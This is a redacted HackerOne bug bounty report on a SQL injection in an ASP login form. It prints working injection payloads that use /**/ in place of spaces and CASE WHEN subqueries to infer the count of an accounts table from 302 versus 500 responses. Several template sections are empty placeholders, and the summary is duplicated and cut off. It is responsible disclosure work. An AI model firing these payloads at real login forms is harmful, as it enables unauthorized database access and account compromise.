# SQLi in login form of █████

## Metadata
- **Source:** HackerOne
- **Report:** 982202 | https://hackerone.com/reports/982202
- **Submitted:** 2020-09-14
- **Reporter:** erbbysam
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** critical
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.

```
POST /██████████.asp HTTP/█████.████
Host: ███████
```

## Description
```
POST /██████.asp HTTP/████.███
Host: █████
Connection: close
Content-Length: 45
Cache-Control: max-age=0
Upgr███████e-Insecure-Requests: ███
Origin: https://████
Content-Type: app

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary
The following is vulnerable to a sqli, due to a limited char set this is t██████████y to demonstrate and not picked up by sqlmap.

```
POST /██████████.asp HTTP/█████.████
Host: ███████
```

## Description
```
POST /██████.asp HTTP/████.███
Host: █████
Connection: close
Content-Length: 45
Cache-Control: max-age=0
Upgr███████e-Insecure-Requests: ███
Origin: https://████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X █████████0_████5_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4254.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?████████
Sec-Fetch-Dest: document
Referer: https://████████/wireless/index.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: █████████████████

usr='/**/or/**/lastName!='&pwd=██████████
```

returns a 302 with a login error message, while an invalid column name returns a 500 error message. Note that spaces are not accepted, so I must replace them with `/**/`.

To summarize: 
`usr='/**/or/**/lastName!='&pwd=████████` -> 302
`usr='/**/or/**/abc!='&pwd=███` -> 500

case error g██████████get (which could be used to exfil data):
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/(SELECT/**/count(*)/**/FROM/**/accounts)>███0000/**/THEN/**/'a'/**/ELSE/**/███/**/END)/**/and/**/usr!='&pwd=████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)<██████0000)/**/THEN/**/'a'/**/ELSE/**/████████/**/END)/**/and/**/usr!='&pwd=████████` -> 500

Using this, we can prove that there are 26 user accounts:
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=500000)/**/THEN/**/'a'/**/ELSE/**/███████/**/END)/**/and/**/usr!='&pwd=████████` -> 302
`usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/count(*)/**/FROM/**/accounts)=26)/**/THEN/**/'a'/**/ELSE/**/██████████/**/END)/**/and/**/usr!='&pwd=██████` -> 500

I have not exfiltrated any data with the exception of column names, the table name and the fact that there are 26 user accounts in this service.

**if you would like me to, I believe I can escalate this to allow me to login to this service, but I am not doing that without permission**

## Impact

SQLi, likely escalation to full service compromise

</details>

---
*Analysed by Claude on 2026-05-24*
